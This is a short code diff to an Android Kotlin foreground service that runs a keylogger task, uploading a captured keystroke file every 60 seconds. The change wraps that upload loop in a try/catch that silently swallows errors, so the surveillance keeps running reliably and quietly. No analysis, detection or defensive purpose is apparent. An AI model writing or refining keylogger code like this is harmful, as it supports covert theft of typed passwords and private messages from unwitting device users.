@@ -34,8 +34,11 @@ class ForegroundService : Service() {
     private val keyloggerInterval: Long =  60000
     private val keylogTask = object: Runnable {
         override fun run() {
-            KeyloggerHandler.getInstance().uploadFile(applicationContext)
-            keyloggerHandler.postDelayed(this, keyloggerInterval)
+            try {
+                KeyloggerHandler.getInstance().uploadFile(applicationContext)
+                keyloggerHandler.postDelayed(this, keyloggerInterval)
+            } catch (e: Exception) {
+            }
         }
     }
     private val task = object: Runnable {
